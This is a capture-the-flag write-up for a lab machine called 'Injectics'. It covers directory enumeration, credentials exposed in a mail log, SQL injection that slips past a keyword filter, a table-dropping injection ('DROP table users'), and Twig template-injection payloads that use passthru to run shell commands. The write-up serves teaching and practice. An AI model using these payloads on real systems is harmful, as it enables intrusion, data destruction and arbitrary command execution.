@@ -1,0 +1,187 @@
+__________________________________________________________________________________________
+
+
+Info found in HomePage source
+
+index.php
+<!-- Website developed by John Tim - dev@injectics.thm-->
+<!-- Mails are stored in mail.log file-->
+
+script.js
+/*************************************************************************************
+* $("#login-form").on("submit", function(e) {
+*     e.preventDefault();
+*     var username = $("#email").val();
+*     var password = $("#pwd").val();
+* 
+*     const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
+*             for (let keyword of invalidKeywords) {
+*                 if (username.includes(keyword)) {
+*                     alert('Invalid keywords detected');
+*                    return false;
+*                 }
+*             }
+* 
+*     $.ajax({
+*         url: 'functions.php',
+*         type: 'POST',
+*         data: {
+*             username: username,
+*             password: password,
+*             function: "login"
+*         },
+*         dataType: 'json',
+*         success: function(data) {
+*             if (data.status == "success") {
+*                 if (data.auth_type == 0){
+*                     window.location = 'dashboard.php';
+*                 }else{
+*                     window.location = 'dashboard.php';
+*                 }
+*             } else {
+*                 $("#messagess").html('<div class="alert alert-danger" role="alert">' + data.message + '</div>');
+*             }
+*         }
+*     });
+* });
+*************************************************************************************/
+
+The filter can be bypassed using obfuscation (e.g., || for OR) or targeting the unprotected password field. 
+Since validation is client-side, it can be disabled or altered in the browser.
+
+
+__________________________________________________________________________________________
+
+
+dirsearch -u http://TARGET_IP
+
+[06:31:26] 200 -   48B  - /composer.json
+[06:31:26] 200 -    9KB - /composer.lock
+[06:31:29] 301 -  310B  - /css  ->  http://10.80.131.67/css/
+[06:31:29] 302 -    0B  - /dashboard.php  ->  dashboard.php
+[06:31:35] 301 -  312B  - /flags  ->  http://10.80.131.67/flags/
+[06:31:41] 301 -  317B  - /javascript  ->  http://10.80.131.67/javascript/
+[06:31:42] 403 -  277B  - /js/
+[06:31:45] 200 -    1KB - /login.php
+[06:31:45] 302 -    0B  - /logout.php  ->  index.php
+[06:31:46] 200 -    1KB - /mail.log
+[06:31:55] 301 -  317B  - /phpmyadmin  ->  http://10.80.131.67/phpmyadmin/
+[06:31:56] 200 -    3KB - /phpmyadmin/
+[06:31:56] 200 -    3KB - /phpmyadmin/doc/html/index.html
+[06:31:56] 200 -    3KB - /phpmyadmin/index.php
+[06:32:04] 403 -  277B  - /server-status/
+[06:32:04] 403 -  277B  - /server-status
+[06:32:18] 403 -  277B  - /vendor/
+[06:32:18] 200 -    0B  - /vendor/composer/autoload_real.php
+[06:32:18] 200 -    0B  - /vendor/composer/autoload_classmap.php
+[06:32:18] 200 -    0B  - /vendor/composer/autoload_namespaces.php
+[06:32:18] 200 -    0B  - /vendor/composer/autoload_files.php
+[06:32:18] 200 -   12KB - /vendor/composer/installed.json
+[06:32:18] 200 -    1KB - /vendor/composer/LICENSE
+[06:32:18] 200 -    0B  - /vendor/composer/ClassLoader.php
+[06:32:18] 200 -    0B  - /vendor/autoload.php
+[06:32:18] 200 -    0B  - /vendor/composer/autoload_psr4.php
+[06:32:18] 200 -    0B  - /vendor/composer/autoload_static.php
+
+OR
+
+gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,js,txt,php,db,json,log -u http://TARGET_IP
+
+/.html                (Status: 403) [Size: 277]
+/.php                 (Status: 403) [Size: 277]
+/index.php            (Status: 200) [Size: 6588]
+/login.php            (Status: 200) [Size: 5401]
+/mail.log             (Status: 200) [Size: 1098]
+/flags                (Status: 301) [Size: 312] [--> http://10.80.131.67/flags/]
+/css                  (Status: 301) [Size: 310] [--> http://10.80.131.67/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.80.131.67/js/]
+/javascript           (Status: 301) [Size: 317] [--> http://10.80.131.67/javascript/]
+/logout.php           (Status: 302) [Size: 0] [--> index.php]
+/vendor               (Status: 301) [Size: 313] [--> http://10.80.131.67/vendor/]
+/script.js            (Status: 200) [Size: 1088]
+/dashboard.php        (Status: 302) [Size: 0] [--> dashboard.php]
+/functions.php        (Status: 200) [Size: 0]
+/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.80.131.67/phpmyadmin/]
+/composer.json        (Status: 200) [Size: 48]
+/.html                (Status: 403) [Size: 277]
+/.php                 (Status: 403) [Size: 277]
+/conn.php             (Status: 200) [Size: 0]
+/server-status        (Status: 403) [Size: 277]
+
+__________________________________________________________________________________________
+
+
+http://10.80.131.67/composer.json
+
+    /*************************************************************************************
+    * twig/twig : "2.14.0"
+    * Twig < 2.4.4 - Server Side Template Injection
+    *************************************************************************************/
+
+http://10.80.131.67/mail.log
+
+    /*************************************************************************************
+    * From: dev@injectics.thm
+    * To: superadmin@injectics.thm
+    * Subject: Update before holidays
+    *
+    * Hey,
+    *
+    * Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.
+    *
+    * To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.
+    *
+    * Here are the default credentials that will be added:
+    *
+    * | Email                     | Password 	            |
+    * |---------------------------|-------------------------|
+    * | superadmin@injectics.thm  | superSecurePasswd101    |
+    * | dev@injectics.thm         | devPasswd123            |
+    *
+    * Please let me know if there are any further updates or changes needed.
+    *
+    * Best regards,
+    * Dev Team
+    *
+    * dev@injectics.thm
+    *************************************************************************************/
+
+__________________________________________________________________________________________
+
+
+TASK 
+
+Since there's sanitization at client-side, we use Burp to bypass it.
+
+The attempt below returns error, should be the sanitization at server-side.
+    username=user' OR 1=1;-- &password=pass&function=login
+
+The attempt below returns no-error, we managed to bypass by changing OR to ||.
+    username=user' || 1=1;-- &password=pass&function=login
+
+After login, we observe that SQLi is possible when editing dashboard.
+Since the mail mention `users` table deleted/collapsed will trigger those default user credentials, we inject:
+    888; DROP table users;
+
+__________________________________________________________________________________________
+
+
+Login to admin page, we observe SSTI is possible when editing profile by using {{4*4}} as name will return 16.
+We tried some SSTI payload such as {{system("ls")}} and {{ls}} but rejected.
+
+Using payload below give us the flag:
+    {{["ls",""]|sort('passthru')}}
+    {{["ls  flags",""]|sort('passthru')}}
+    {{["cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt",""]|sort('passthru')}}
+
+__________________________________________________________________________________________
+
+
+Bonus
+
+Some people will using reverse shell on the last step.
+
+__________________________________________________________________________________________
+
+
+Appendix:
